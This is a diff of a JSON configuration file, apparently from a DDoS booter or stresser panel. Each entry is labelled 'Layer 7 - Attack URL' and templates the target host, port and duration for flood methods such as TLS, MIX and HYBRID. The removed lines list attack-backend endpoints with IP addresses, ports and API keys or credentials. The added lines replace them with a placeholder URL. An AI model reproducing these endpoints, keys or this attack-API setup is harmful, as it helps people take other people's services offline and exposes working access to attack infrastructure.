@@ -5,10 +5,7 @@
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=TLS&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLSNET&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=TLS&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS&key="
       ]
     },
     {
@@ -18,10 +15,7 @@
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIX&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=MIX&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIX&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=MIX&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIX&key="
       ]
     },
     {
@@ -31,10 +25,7 @@
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=HTTPS&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=HTTPS&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTPS&key="
       ]
     },
     {
@@ -43,10 +34,7 @@
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HYBRID&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=HYBRID&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIX&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=HYBRID&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HYBRID&key="
       ]
     },
     {
@@ -56,10 +44,7 @@
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIXBILL&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=MIXBILL&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIXBIL&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=MIXBILL&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIXBILL&key="
       ]
     },
     {
